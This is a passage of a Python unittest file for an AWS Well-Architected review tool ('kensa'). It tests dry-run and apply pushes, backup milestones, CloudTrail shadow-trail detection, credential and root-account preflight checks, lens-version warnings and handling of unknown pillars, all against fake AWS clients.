        self.apply(aws(ENC, "○"))
        run(["finalize", "--allow-empty"], self.d)
        code, out, _ = run(["push", "--workload-id", "w-1"], self.d)
        self.assertIn("warning: 11 assumed ✗", out)
        code, out, _ = run(["push", "--workload-id", "w-1", "--exclude-assumed"], self.d)
        self.assertIn("will not be sent", out)
        self.assertIn("{'dry-run': 1}", out)   # only the one question answered ○ is sent

    def test_milestone_option_is_validated_and_dry_run_never_creates_it(self):
        run(["finalize", "--allow-empty"], self.d)
        code, _, err = run(["push", "--workload-id", "w-1", "--milestone", "ab"], self.d)
        self.assertNotEqual(code, 0)
        code, out, _ = run(["push", "--workload-id", "w-1", "--milestone", "2026Q4"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("DRY-RUN", out)
        self.assertIn("only with --apply", out)


class MilestoneAndAssumed(unittest.TestCase):
    def items(self):
        mk = lambda cid, q, v, ch="aws": {"choice_id": cid, "question_id": q, "pillar": "Security", "verdict": v, "channel": ch, "confidence": "H", "evidence": "e"}
        return [mk("a", "q1", "○"), mk("b", "q2", "✗", "assumed"), mk("c", "q2", "✗", "assumed"), mk("d", "q3", "△")]

    def test_plan_updates_can_leave_assumed_questions_unanswered(self):
        self.assertEqual([p["QuestionId"] for p in kensa_wa.plan_updates(self.items())], ["q1", "q2", "q3"])
        self.assertEqual([p["QuestionId"] for p in kensa_wa.plan_updates(self.items(), exclude_assumed=True)], ["q1", "q3"])

    def test_excluding_assumed_never_marks_a_question_not_applicable(self):
        mk = lambda cid, q, v, ch="aws": {"choice_id": cid, "question_id": q, "pillar": "Security", "verdict": v, "channel": ch, "confidence": "H", "evidence": "e"}
        # q1: N/A mixed with an assumed ✗. Even if what remains after excluding the assumed item is only N/A, the whole question does not become 'not applicable'
        # q2: all N/A. This question is not applicable as a whole
        # q3: a real ✗ and an assumed ✗. 'None of these is implemented' must not be sent (an assumed item is unconfirmed)
        items = [mk("a", "q1", "N/A", "interview"), mk("b", "q1", "✗", "assumed"),
                 mk("c", "q2", "N/A", "interview"), mk("d", "q2", "N/A", "interview"),
                 mk("e", "q3", "✗", "aws"), mk("f", "q3", "✗", "assumed")]
        none = {"q1": "q1_none", "q3": "q3_none"}
        for exclude in (False, True):
            by = {p["QuestionId"]: p for p in kensa_wa.plan_updates(items, none, exclude_assumed=exclude)}
            self.assertIs(by["q2"]["IsApplicable"], False, exclude)
            self.assertIs(by["q1"]["IsApplicable"], True, exclude)
            self.assertIs(by["q3"]["IsApplicable"], True, exclude)
        by = {p["QuestionId"]: p for p in kensa_wa.plan_updates(items, none, exclude_assumed=True)}
        self.assertEqual(list(by["q1"]["ChoiceUpdates"]), ["a"])
        self.assertEqual(by["q1"]["ChoiceUpdates"]["a"]["Status"], "NOT_APPLICABLE")
        # a question with excluded items gets no 'None of these' (it would also settle the excluded items as not implemented)
        self.assertNotIn("q1_none", by["q1"]["ChoiceUpdates"])
        self.assertNotIn("q3_none", by["q3"]["ChoiceUpdates"])
        # without exclusion, 'None of these' is selected as before
        full = {p["QuestionId"]: p for p in kensa_wa.plan_updates(items, none)}
        self.assertEqual(full["q3"]["ChoiceUpdates"]["q3_none"]["Status"], "SELECTED")

    def test_milestone_only_after_a_fully_successful_push(self):
        calls = []

        class C:
            def list_answers(self, **kw):
                return {"AnswerSummaries": []}

            def update_answer(self, **kw):
                calls.append(("update_answer", kw["QuestionId"]))

            def create_milestone(self, **kw):
                calls.append(("create_milestone", kw))
                return {"MilestoneNumber": 3}
        res = kensa_wa.push("w", self.items(), apply=True, c=C(), milestone="2026Q4-review")
        self.assertEqual(res[-1], {"question_id": "(milestone)", "status": "milestone", "milestone": "2026Q4-review", "number": 3})
        self.assertEqual(calls[-1], ("create_milestone", {"WorkloadId": "w", "MilestoneName": "2026Q4-review"}))
        self.assertEqual(sum(1 for c in calls if c[0] == "update_answer"), 3)

    def test_no_milestone_when_any_question_failed_or_in_dry_run(self):
        calls = []

        class C:
            def list_answers(self, **kw):
                return {"AnswerSummaries": []}

            def update_answer(self, **kw):
                if kw["QuestionId"] == "q3":
                    raise Fake("ValidationException", "boom")

            def create_milestone(self, **kw):
                calls.append(kw)
        res = kensa_wa.push("w", self.items(), apply=True, c=C(), milestone="2026Q4-review")
        self.assertEqual(res[-1]["status"], "milestone-skipped")
        self.assertEqual(calls, [])
        res = kensa_wa.push("w", self.items(), apply=False, milestone="2026Q4-review")
        self.assertTrue(all(r["status"] == "dry-run" for r in res))
        self.assertEqual(calls, [])

    def setUp(self):
        p = mock.patch.object(kensa_wa.time, "sleep")
        self.sleeps = p.start()
        self.addCleanup(p.stop)

    def test_milestone_failure_is_reported_not_raised(self):
        class C:
            def list_answers(self, **kw):
                return {"AnswerSummaries": []}

            def update_answer(self, **kw):
                pass

            def create_milestone(self, **kw):
                raise Fake("ValidationException", "name already used")
        res = kensa_wa.push("w", self.items(), apply=True, c=C(), milestone="2026Q4-review")
        self.assertEqual(res[-1]["status"], "milestone-error")
        self.assertEqual(sum(1 for r in res if r["status"] == "updated"), 3)

    def test_a_busy_workload_is_retried(self):
        # F5: right after UpdateAnswer, CreateMilestone answered ConflictException (the workload was still busy); wait and try again
        n = {"m": 0}

        class C:
            def list_answers(self, **kw):
                return {"AnswerSummaries": []}

            def update_answer(self, **kw):
                pass

            def create_milestone(self, **kw):
                n["m"] += 1
                if n["m"] < 3:
                    raise Fake("ConflictException", "busy")
                return {"MilestoneNumber": 7}
        res = kensa_wa.push("w", self.items(), apply=True, c=C(), milestone="2026Q4-review")
        self.assertEqual(res[-1], {"question_id": "(milestone)", "status": "milestone", "milestone": "2026Q4-review", "number": 7})
        self.assertEqual(self.sleeps.call_count, 2)

    def test_existing_answers_are_saved_as_a_milestone_before_they_are_overwritten(self):
        # F9: a push --apply overwrote 14 answers that could not be restored afterwards
        calls = []

        class C:
            def list_answers(self, **kw):
                calls.append(("list_answers", kw.get("NextToken")))
                if not kw.get("NextToken"):
                    return {"AnswerSummaries": [{"QuestionId": "q1", "SelectedChoices": ["a"]}, {"QuestionId": "q2", "SelectedChoices": []}],
                            "NextToken": "t"}
                return {"AnswerSummaries": [{"QuestionId": "q3", "SelectedChoices": [], "IsApplicable": False}]}

            def update_answer(self, **kw):
                calls.append(("update_answer", kw["QuestionId"]))

            def create_milestone(self, **kw):
                calls.append(("create_milestone", kw["MilestoneName"]))
                return {"MilestoneNumber": 1}
        res = kensa_wa.push("w", self.items(), apply=True, c=C())
        names = [c for c in calls if c[0] != "list_answers"]
        self.assertEqual(names[0][0], "create_milestone")
        self.assertRegex(names[0][1], r"^kensa-before-push-\d{8}T\d{6}Z$")
        self.assertEqual(sum(1 for c in names if c[0] == "update_answer"), 3)
        self.assertEqual(res[0]["status"], "backup-milestone")
        self.assertEqual(res[0]["existing"], 2)

    def test_no_backup_milestone_for_an_empty_workload_or_when_turned_off(self):
        made = []

        class C:
            def __init__(self, answered):
                self.answered = answered

            def list_answers(self, **kw):
                return {"AnswerSummaries": [{"QuestionId": "q1", "SelectedChoices": ["a"] if self.answered else []}]}

            def update_answer(self, **kw):
                pass

            def create_milestone(self, **kw):
                made.append(kw)
                return {}
        kensa_wa.push("w", self.items(), apply=True, c=C(False))
        kensa_wa.push("w", self.items(), apply=True, c=C(True), backup=False)
        self.assertEqual(made, [])

    def test_nothing_is_written_when_the_backup_milestone_fails(self):
        updated = []

        class C:
            def list_answers(self, **kw):
                return {"AnswerSummaries": [{"QuestionId": "q1", "SelectedChoices": ["a"]}]}

            def update_answer(self, **kw):
                updated.append(kw)

            def create_milestone(self, **kw):
                raise Fake("AccessDeniedException", "no CreateMilestone")
        res = kensa_wa.push("w", self.items(), apply=True, c=C(), milestone="2026Q4-review")
        self.assertEqual([r["status"] for r in res], ["backup-milestone-error"])
        self.assertEqual(updated, [])


class CloudTrailShadowTrails(unittest.TestCase):
    def test_trails_homed_elsewhere_and_organization_trails_are_counted(self):
        # F4: a multi-Region trail homed in another Region and an organization trail are shadow trails here; leaving them out reported "no trail"
        calls = []

        class CT(FakeClient):
            def describe_trails(self, **kw):
                calls.append(kw)
                return {"trailList": [
                    {"TrailARN": "arn:aws:cloudtrail:us-east-1:111111111111:trail/main", "HomeRegion": "us-east-1", "IsMultiRegionTrail": True},
                    {"TrailARN": "arn:aws:cloudtrail:us-east-1:111111111111:trail/main", "HomeRegion": "us-east-1", "IsMultiRegionTrail": True},
                    {"TrailARN": "arn:aws:cloudtrail:us-east-1:999999999999:trail/org", "HomeRegion": "us-east-1", "IsMultiRegionTrail": True,
                     "IsOrganizationTrail": True}]}

            def get_trail_status(self, Name):
                if "999999999999" in Name:
                    raise Fake("TrailNotFoundException")
                return {"IsLogging": True}

        class S:
            def c(self, svc, r):
                return CT(svc, {})
        out = kensa_scan._ct(S(), "ap-northeast-1")
        self.assertEqual(calls, [{"includeShadowTrails": True}])
        self.assertEqual(len(out["trails"]), 2)
        self.assertTrue(all(t["shadow"] and t["home_region"] == "us-east-1" for t in out["trails"]))
        self.assertEqual([t["is_logging"] for t in out["trails"]], [True, None])


def named_exc(name, msg="x"):
    """botocore exceptions (NoCredentialsError etc.) are recognised by type name, so a same-named exception can stand in for them (no boto3 needed)."""
    return type(name, (Exception,), {})(msg)


STS = ("sts", "get_caller_identity")
STS_OK = {STS: {"Account": "123456789012", "Arn": "arn:aws:sts::123456789012:assumed-role/ReadOnly/me"}}


class AuthPreflight(Seeded):
    """Credential check before touching AWS. A scan must never say 'done' without credentials."""

    def setUp(self):
        super().setUp()
        p = mock.patch.object(kensa_wa, "client", side_effect=AssertionError("the test tried to create a real AWS client"))
        p.start()
        self.addCleanup(p.stop)

    def sess(self, table):
        return mock.patch.object(kensa_scan, "make_session", lambda profile=None, region=None: FakeSession(table))

    def ev(self, name):
        return os.path.join(self.d, "evidence", name)

    def test_preflight_returns_identity(self):
        r = kensa_scan.preflight(FakeSession(STS_OK))
        self.assertEqual(r, {"account": "123456789012", "arn": "arn:aws:sts::123456789012:assumed-role/ReadOnly/me",
                             "principal_type": "assumed-role"})
        root = {STS: {"Account": "123456789012", "Arn": "arn:aws:iam::123456789012:root"}}
        self.assertEqual(kensa_scan.preflight(FakeSession(root))["principal_type"], "root")

    def test_each_credential_failure_stops_with_the_next_step(self):
        cases = [
            (named_exc("NoCredentialsError"), "--profile"),
            (named_exc("UnauthorizedSSOTokenError"), "aws sso login --profile p1"),
            (named_exc("TokenRetrievalError"), "aws sso login --profile p1"),
            (named_exc("SSOTokenLoadError"), "aws sso login --profile p1"),
            (named_exc("ProfileNotFound"), "aws configure list-profiles"),
            (named_exc("PartialCredentialsError"), "incomplete"),
            (Fake("ExpiredToken", "expired"), "expired"),
            (Fake("InvalidClientTokenId", "bad"), "invalid"),
            (named_exc("EndpointConnectionError"), "cannot connect"),
        ]
        for exc, expect in cases:
            with self.assertRaises(kensa_scan.AuthError, msg=type(exc).__name__) as cm:
                kensa_scan.preflight(FakeSession({STS: exc}), profile="p1")
            self.assertIn(expect, str(cm.exception), type(exc).__name__)

    def test_unknown_profile_name_is_reported_not_a_traceback(self):
        # boto3.Session(profile_name=...) raises ProfileNotFound as soon as the Session is created when the profile does not exist
        class FakeBoto3:
            @staticmethod
            def Session(**kw):
                raise named_exc("ProfileNotFound", "The config profile (nope) could not be found")
        with mock.patch.dict(sys.modules, {"boto3": FakeBoto3}):
            with self.assertRaises(kensa_scan.AuthError) as cm:
                kensa_scan.make_session("nope", "ap-northeast-1")
            self.assertIn("aws configure list-profiles", str(cm.exception))
            code, _, err = run(["auth-check", "--profile", "nope"], self.d)
        self.assertEqual(code, 3)
        self.assertIn("'nope'", err)

    def test_sso_hint_without_profile_asks_for_a_name(self):
        with self.assertRaises(kensa_scan.AuthError) as cm:
            kensa_scan.preflight(FakeSession({STS: named_exc("UnauthorizedSSOTokenError")}))
        self.assertIn("aws sso login --profile <profile-name>", str(cm.exception))

    def test_unexpected_account_is_refused_and_expected_one_passes(self):
        with self.assertRaises(kensa_scan.AuthError) as cm:
            kensa_scan.preflight(FakeSession(STS_OK), expected_accounts=["999999999999"])
        self.assertIn("999999999999", str(cm.exception))
        self.assertEqual(kensa_scan.preflight(FakeSession(STS_OK), expected_accounts=["999999999999", 123456789012])["account"], "123456789012")
        self.assertEqual(kensa_scan.preflight(FakeSession(STS_OK), expected_accounts=[])["account"], "123456789012")

    def test_scan_aws_without_credentials_stops_and_records_nothing(self):
        with self.sess({STS: named_exc("NoCredentialsError")}):
            code, out, err = run(["scan-aws", "--regions", "ap-northeast-1"], self.d)
        self.assertEqual(code, 3)
        self.assertIn("no credentials were found", err)
        self.assertNotIn("AWS scan done", out)
        self.assertFalse(os.path.exists(self.ev("aws-scan.json")))
        self.assertNotIn("aws", self.work()["meta"].get("scans", {}))

    def test_scan_aws_shows_the_account_and_then_scans(self):
        with self.sess(STS_OK):
            code, out, err = run(["scan-aws", "--regions", "ap-northeast-1"], self.d)
        self.assertEqual(code, 0, err)
        self.assertIn("AWS target: account 123456789012 / assumed-role", out)
        self.assertLess(out.index("AWS target"), out.index("AWS scan done"))
        self.assertEqual(read_json(self.ev("aws-scan.json"))["account"], "123456789012")

    def test_scan_aws_refuses_an_account_not_in_context(self):
        run(["context", "set", 'aws.account_ids=["999999999999"]'], self.d)
        with self.sess(STS_OK):
            code, _, err = run(["scan-aws", "--regions", "ap-northeast-1"], self.d)
        self.assertEqual(code, 3)
        self.assertIn("999999999999", err)
        self.assertFalse(os.path.exists(self.ev("aws-scan.json")))

    def test_auth_check_reports_identity_and_suggests_pinning_the_account(self):
        with self.sess(STS_OK):
            code, out, _ = run(["auth-check"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("123456789012", out)
        self.assertIn("aws.account_ids", out)   # a hint is shown when it is not set
        run(["context", "set", 'aws.account_ids=["123456789012"]'], self.d)
        with self.sess(STS_OK):
            code, out, _ = run(["auth-check"], self.d)
        self.assertEqual(code, 0)
        self.assertNotIn("hint:", out)

    def test_root_credentials_are_refused_unless_explicitly_allowed(self):
        root = {STS: {"Account": "123456789012", "Arn": "arn:aws:iam::123456789012:root"}}
        with self.sess(root):
            code, _, err = run(["auth-check"], self.d)
        self.assertEqual(code, 3)
        self.assertIn("root", err)
        self.assertIn("--allow-root", err)
        # the scan stops too, and nothing is saved
        with self.sess(root):
            code, _, err = run(["scan-aws", "--regions", "ap-northeast-1"], self.d)
        self.assertEqual(code, 3)
        self.assertFalse(os.path.exists(self.ev("aws-scan.json")))
        # only when explicitly allowed (a warning is shown)
        with self.sess(root):
            code, _, err = run(["auth-check", "--allow-root"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("root", err)

    def test_push_dry_run_needs_no_credentials_but_apply_checks_them_first(self):
        run(["finalize", "--allow-empty"], self.d)

        def never(*a, **k):
            raise AssertionError("dry-run must not create an AWS session")
        with mock.patch.object(kensa_scan, "make_session", never):
            code, out, _ = run(["push", "--workload-id", "w-1"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("DRY-RUN", out)
        sent = []
        with self.sess({STS: named_exc("UnauthorizedSSOTokenError")}), \
                mock.patch.object(kensa_wa, "push", lambda *a, **k: sent.append(1) or []):
            code, _, err = run(["push", "--workload-id", "w-1", "--apply"], self.d)
        self.assertEqual(code, 3)
        self.assertIn("aws sso login", err)
        self.assertEqual(sent, [])   # nothing is sent unless authentication succeeds

    def test_workload_create_dry_run_needs_no_credentials_but_apply_checks_them_first(self):
        def never(*a, **k):
            raise AssertionError("dry-run must not create an AWS session")
        args = ["workload-create", "--name", "kensa-test", "--owner", "Taro Yamada taro@example.com", "--regions", "ap-northeast-1"]
        with mock.patch.object(kensa_scan, "make_session", never):
            code, out, _ = run(args, self.d)
        self.assertEqual(code, 0)
        self.assertIn("dry-run", out)
        with self.sess({STS: named_exc("NoCredentialsError")}):
            code, _, _ = run(args + ["--apply"], self.d)
        self.assertEqual(code, 3)

    def test_precheck_and_seed_from_wa_tool_check_credentials_first(self):
        for argv in (["precheck", "--workload-id", "w-1"], ["seed", "--from-wa-tool", "--workload-id", "w-1"]):
            with self.sess({STS: named_exc("NoCredentialsError")}):
                code, _, err = run(argv, self.d)
            self.assertEqual(code, 3, argv)
            self.assertIn("no credentials were found", err)


class LensUpdates(Seeded):
    """A new W-A lens version: warn when the workload is not on the current one, flag reworded items, and keep unknown pillars visible."""

    OLD_AT = "2026-01-01T00:00:00+09:00"

    def rows_csv(self, mutate=None, extra=()):
        rows = list(csv.DictReader(io.StringIO(read_text(FIXTURE))))
        for r in rows:
            if mutate:
                mutate(r)
        rows += list(extra)
        p = os.path.join(self.tmp.name, "v2.csv")
        with open(p, "w", encoding="utf-8", newline="") as f:
            w = csv.DictWriter(f, fieldnames=list(rows[0]))
            w.writeheader()
            w.writerows(rows)
        return p

    def verdict(self, cid, v="○"):
        code, _, err = self.apply({"choice_id": cid, "verdict": v, "channel": "repo", "confidence": "H", "evidence": "x"})
        self.assertEqual(code, 0, err)
        w = self.work()
        for it in w["items"]:
            if it["choice_id"] == cid:
                it["evidence_at"] = self.OLD_AT        # recorded long ago, so that a later change is clearly after it
        self.save_work(w)

    def reword(self, cid, **fields):
        return lambda r: r.update(fields) if r["ChoiceId"] == cid else None

    # ---- the lens status
    def seed_from_wa_tool(self, status, version="2025-02-25"):
        rows = [{"choice_id": "c1", "question_id": "q1", "pillar": "Security", "question_title": "T", "best_practice": "B", "description": "D",
                 "aws_checkable": "", "help_url": "", "improvement_url": "", "question_risk": ""}]
        meta = {"source": "wa-tool", "lens": "wellarchitected", "lens_version": version, "lens_status": status, "workload_id": "w-1",
                "fetched_at": "2026-11-03T00:00:00+09:00", "none_choices": {}}
        table = {STS: {"Account": "123456789012", "Arn": "arn:aws:sts::123456789012:assumed-role/WaTool/me"}}
        with mock.patch.object(kensa_scan, "make_session", lambda profile=None, region=None: FakeSession(table)), \
                mock.patch.object(kensa_wa, "fetch", return_value=(rows, meta)):
            return run(["seed", "--from-wa-tool", "--workload-id", "w-1"], self.d)

    def test_a_current_lens_gives_no_warning(self):
        code, out, err = self.seed_from_wa_tool("CURRENT")
        self.assertEqual(code, 0, err)
        self.assertIn("lens_status=CURRENT", out)
        self.assertNotIn("warning: the lens status", err)

    def test_a_not_current_lens_warns_and_says_what_to_do(self):
        code, out, err = self.seed_from_wa_tool("NOT_CURRENT", "2024-06-27")
        self.assertEqual(code, 0, err)                       # a warning, not a failure: the review can go on with the old version
        self.assertIn("lens_status=NOT_CURRENT", out)
        self.assertIn("warning: the lens status is NOT_CURRENT", err)
        self.assertIn("2024-06-27", err)
        self.assertIn("not the current version", err)
        self.assertIn("kensa does not upgrade it", err)       # an upgrade writes to the workload, so kensa never does it
        self.assertIn("upgrade the lens review in the W-A Tool console", err)
        self.assertEqual(self.work()["meta"]["lens_status"], "NOT_CURRENT")

    def test_deprecated_deleted_and_unknown_statuses_warn_too(self):
        for status, phrase in (("DEPRECATED", "is deprecated"), ("DELETED", "was deleted"), ("SOMETHING_NEW", "is not CURRENT")):
            code, _, err = self.seed_from_wa_tool(status)
            self.assertEqual(code, 0, err)
            self.assertIn(f"warning: the lens status is {status}", err)
            self.assertIn(phrase, err)

    def test_plan_keeps_reminding_about_a_lens_that_is_not_current(self):
        self.seed_from_wa_tool("NOT_CURRENT")
        _, out, _ = run(["plan"], self.d)
        self.assertIn("0. The lens status is NOT_CURRENT", out)
        _, out, _ = run(["plan", "--json"], self.d)
        j = json.loads(out)
        self.assertEqual(j["lens_status"], "NOT_CURRENT")
        self.assertTrue(j["next_steps"][0].startswith("0. "))
        self.seed_from_wa_tool("CURRENT")                     # once the lens review is upgraded and fetched again, the reminder is gone
        _, out, _ = run(["plan"], self.d)
        self.assertNotIn("The lens status is", out)

    def test_a_csv_seed_has_no_lens_status(self):
        _, out, err = run(["seed", "--from-csv", FIXTURE], self.d)
        self.assertNotIn("lens_status", out)
        self.assertNotIn("warning", err)

    # ---- reworded items
    def test_a_reworded_item_with_a_verdict_is_flagged_for_a_recheck(self):
        self.verdict("sec_protect_data_rest_encrypt")
        p = self.rows_csv(self.reword("sec_protect_data_rest_encrypt", Description="a changed description"))
        code, out, _ = run(["seed", "--from-csv", p], self.d)
        self.assertEqual(code, 0)
        self.assertIn("the lens text changed for 1 item(s) that already have a verdict", out)
        self.assertIn("sec_protect_data_rest_encrypt", out)
        it = self.item("sec_protect_data_rest_encrypt")
        self.assertEqual(it["lens_changed"]["fields"], ["description"])
        self.assertEqual(it["description"], "a changed description")      # the new wording is stored
        self.assertEqual(it["verdict"], "○")                               # the verdict is kept, only flagged
        self.assertTrue(kensa.lens_text_changed(it))
        # the other items were not touched
        self.assertFalse(any("lens_changed" in i for i in self.work()["items"] if i["choice_id"] != "sec_protect_data_rest_encrypt"))

    def test_whitespace_and_url_changes_are_not_a_reword(self):
        self.verdict("sec_protect_data_rest_encrypt")

        def tweak(r):
            if r["ChoiceId"] == "sec_protect_data_rest_encrypt":
                r["Description"] = "  " + r["Description"].replace(" ", "  ") + "\n"
        p = self.rows_csv(tweak)
        _, out, _ = run(["seed", "--from-csv", p], self.d)
        self.assertNotIn("the lens text changed", out)
        self.assertNotIn("lens_changed", self.item("sec_protect_data_rest_encrypt"))
        merged = kensa.merge_items(self.work()["items"], [{**{k: v for k, v in self.item("sec_protect_data_rest_encrypt").items() if k in
                                                             ("choice_id", "question_id", "pillar", "question_title", "best_practice", "description")},
                                                           "improvement_url": "https://new.example/plan"}], changed=[])[0]
        self.assertNotIn("lens_changed", next(i for i in merged if i["choice_id"] == "sec_protect_data_rest_encrypt"))

    def test_a_reworded_item_without_a_verdict_is_not_reported(self):
        p = self.rows_csv(self.reword("sec_protect_data_rest_encrypt", BestPractice="Another title"))
        _, out, _ = run(["seed", "--from-csv", p], self.d)
        self.assertNotIn("the lens text changed", out)       # nothing was recorded on the old wording, so there is nothing to re-check
        self.assertFalse(kensa.lens_text_changed(self.item("sec_protect_data_rest_encrypt")))

    def test_a_flag_clears_once_the_item_is_confirmed_again(self):
        self.verdict("sec_protect_data_rest_encrypt")
        run(["seed", "--from-csv", self.rows_csv(self.reword("sec_protect_data_rest_encrypt", Description="new words"))], self.d)
        self.assertTrue(kensa.lens_text_changed(self.item("sec_protect_data_rest_encrypt")))
        w = self.work()
        for it in w["items"]:
            if it["choice_id"] == "sec_protect_data_rest_encrypt":
                it["lens_changed"]["at"] = "2026-02-01T00:00:00+09:00"
                it["evidence_at"] = "2026-03-01T00:00:00+09:00"       # a verdict recorded after the change
        self.save_work(w)
        self.assertFalse(kensa.lens_text_changed(self.item("sec_protect_data_rest_encrypt")))

    def test_the_wording_is_not_compared_when_the_old_worklist_came_from_another_source(self):
        self.verdict("sec_protect_data_rest_encrypt")
        rows = list(csv.DictReader(io.StringIO(read_text(FIXTURE))))
        fetched = [{"choice_id": r["ChoiceId"], "question_id": r["QuestionId"], "pillar": r["Pillar"], "question_title": r["QuestionTitle"],
                    "best_practice": r["BestPractice"], "description": "worded differently by the W-A Tool", "aws_checkable": "", "help_url": "",
                    "improvement_url": "", "question_risk": ""} for r in rows]
        meta = {"source": "wa-tool", "lens": "wellarchitected", "lens_version": "v", "lens_status": "CURRENT", "workload_id": "w-1",
                "fetched_at": "2026-11-03T00:00:00+09:00", "none_choices": {}}
        table = {STS: {"Account": "123456789012", "Arn": "arn:aws:sts::123456789012:assumed-role/WaTool/me"}}
        with mock.patch.object(kensa_scan, "make_session", lambda profile=None, region=None: FakeSession(table)), \
                mock.patch.object(kensa_wa, "fetch", return_value=(fetched, meta)):
            code, out, err = run(["seed", "--from-wa-tool", "--workload-id", "w-1"], self.d)
        self.assertEqual(code, 0, err)
        self.assertIn("another source", out)
        self.assertFalse(any("lens_changed" in i for i in self.work()["items"]))     # CSV and W-A Tool word things differently: do not flag them all

    @needs_openpyxl
    def test_openitems_lists_a_reworded_item_in_both_locales(self):
        from openpyxl import load_workbook
        self.verdict("sec_protect_data_rest_encrypt")
        run(["seed", "--from-csv", self.rows_csv(self.reword("sec_protect_data_rest_encrypt", Description="new words"))], self.d)
        for lang, phrase in (("en", "wording of this item changed in the lens (description)"), ("ja", "レンズ側でこの項目の文言が変わった(説明)")):
            out = os.path.join(self.tmp.name, f"o-{lang}.xlsx")
            code, _, err = run(["export", "--format", "xlsx", "--out", out], self.d, lang=lang)
            self.assertEqual(code, 0, err)
            rows = [[c.value for c in r] for r in load_workbook(out)["OpenItems"].iter_rows(min_row=2)]
            hit = [r for r in rows if r[1] == "sec_protect_data_rest_encrypt"]
            self.assertEqual(len(hit), 1, rows)
            self.assertIn(phrase, hit[0][6])

    # ---- a pillar kensa does not know
    NEW_PILLAR = {"Pillar": "Resilience", "QuestionId": "resi-1", "QuestionTitle": "A question in a new pillar", "ChoiceId": "resi_1_1",
                  "BestPractice": "A best practice in a new pillar", "Description": "synthetic", "AWSCheckable": ""}

    def seed_with_new_pillar(self):
        code, out, err = run(["seed", "--from-csv", self.rows_csv(extra=[self.NEW_PILLAR])], self.d)
        self.assertEqual(code, 0, err)

    def test_pillars_in_and_sort_key_put_unknown_pillars_last_and_grouped(self):
        items = [{"pillar": p} for p in ("Zeta", "Cost Optimization", "Alpha", "Security", "Zeta")]
        self.assertEqual(kensa.pillars_in(items), ["Security", "Cost Optimization", "Zeta", "Alpha"])   # known order, then first-seen
        self.assertEqual(sorted(["Zeta", "Alpha", "Sustainability", "Security"], key=kensa.pillar_sort_key), ["Security", "Sustainability", "Alpha", "Zeta"])

    def test_status_and_coverage_show_an_unknown_pillar(self):
        self.seed_with_new_pillar()
        _, out, _ = run(["status"], self.d)
        self.assertIn("Resilience", out)
        _, out, _ = run(["coverage", "--all", "--json"], self.d)
        j = json.loads(out)
        self.assertIn("Resilience", j["by_pillar"])
        self.assertEqual(sum(v["total"] for v in j["by_pillar"].values()), j["total"])      # nothing is dropped from the total

    def test_csv_export_keeps_an_unknown_pillar_after_the_known_ones(self):
        self.seed_with_new_pillar()
        run(["finalize", "--allow-empty"], self.d)
        out = os.path.join(self.tmp.name, "o.csv")
        run(["export", "--format", "csv", "--out", out], self.d)
        pillars = [r[0] for r in csv.reader(io.StringIO(read_text(out, "utf-8-sig")))][1:]
        self.assertEqual(pillars[-1], "Resilience")
        self.assertEqual(len(pillars), 13)

    @needs_openpyxl
    def test_xlsx_summary_has_a_row_for_an_unknown_pillar_and_counts_it_in_the_total(self):
        from openpyxl import load_workbook
        self.seed_with_new_pillar()
        run(["finalize", "--allow-empty"], self.d)
        out = os.path.join(self.tmp.name, "o.xlsx")
        code, _, err = run(["export", "--format", "xlsx", "--out", out], self.d)
        self.assertEqual(code, 0, err)
        wb = load_workbook(out)
        rows = [[c.value for c in r] for r in wb["Summary"].iter_rows(min_row=5, max_row=20)]
        names = [r[0] for r in rows if r[0]]
        self.assertIn("Resilience", names)
        self.assertLess(names.index("Security"), names.index("Resilience"))
        total_row = next(r for r in rows if r[0] and str(r[0]).startswith(("Total", "合計")))
        pillar_rows = [r for r in rows if r[0] in names[:names.index(total_row[0])]]
        self.assertEqual(len(pillar_rows), len(names[:names.index(total_row[0])]))
        res = next(r for r in rows if r[0] == "Resilience")
        self.assertEqual(res[6], "=SUM(B{0}:F{0})".format(rows.index(res) + 5))                # the same per-pillar formulas as the known pillars
        sec = next(r for r in rows if r[0] == "Security")
        self.assertEqual(sec[6], "=SUM(B{0}:F{0})".format(rows.index(sec) + 5))
        self.assertTrue(any(c.value == "Resilience" for r in wb["Checklist"].iter_rows(min_row=2) for c in r[:1]))


class AdminHint(Seeded):
    """`auth-check` / `scan-aws` warn when the credentials look like an administrator. It is a best-effort hint: it warns, never stops."""

    ACCT = "123456789012"

    def setUp(self):
        super().setUp()
        p = mock.patch.object(kensa_wa, "client", side_effect=AssertionError("the test tried to create a real AWS client"))
        p.start()
        self.addCleanup(p.stop)

    def sess(self, table):
        return mock.patch.object(kensa_scan, "make_session", lambda profile=None, region=None: FakeSession(table))

    def role(self, name="ReadOnly"):
        return {STS: {"Account": self.ACCT, "Arn": f"arn:aws:sts::{self.ACCT}:assumed-role/{name}/me"}}

    @staticmethod
    def attached(*arns):
        return {("iam", "list_attached_role_policies"): {"AttachedPolicies": [{"PolicyName": a.rsplit("/", 1)[-1], "PolicyArn": a} for a in arns]},
                ("iam", "list_role_policies"): {"PolicyNames": []}}

    def test_principal_ref_reads_roles_and_users_only(self):
        ref = kensa_scan.principal_ref
        self.assertEqual(ref("arn:aws:sts::123456789012:assumed-role/Ro/me"), ("role", "Ro"))
        self.assertEqual(ref("arn:aws:iam::123456789012:role/some/path/Ro"), ("role", "Ro"))
        self.assertEqual(ref("arn:aws:iam::123456789012:user/team/alice"), ("user", "alice"))
        self.assertEqual(ref("arn:aws-cn:sts::123456789012:assumed-role/Ro/me"), ("role", "Ro"))
        for other in ("arn:aws:iam::123456789012:root", "arn:aws:sts::123456789012:federated-user/bob", "", None):
            self.assertIsNone(ref(other), other)

    def test_allows_everything_needs_an_unconditional_allow_of_star_on_star(self):
        f = kensa_scan.allows_everything
        star = {"Effect": "Allow", "Action": "*", "Resource": "*"}
        self.assertTrue(f({"Statement": star}))                                             # a single statement, not a list
        self.assertTrue(f({"Statement": [{"Effect": "Allow", "Action": ["*"], "Resource": ["*"]}]}))
        self.assertTrue(f(urllib.parse.quote(json.dumps({"Statement": [star]}))))           # a URL-encoded string document
        self.assertFalse(f({"Statement": [{**star, "Condition": {"Bool": {"aws:SecureTransport": "true"}}}]}))
        self.assertFalse(f({"Statement": [{**star, "Effect": "Deny"}]}))
        self.assertFalse(f({"Statement": [{"Effect": "Allow", "NotAction": "iam:*", "Resource": "*"}]}))
        self.assertFalse(f({"Statement": [{"Effect": "Allow", "Action": "s3:*", "Resource": "*"}]}))
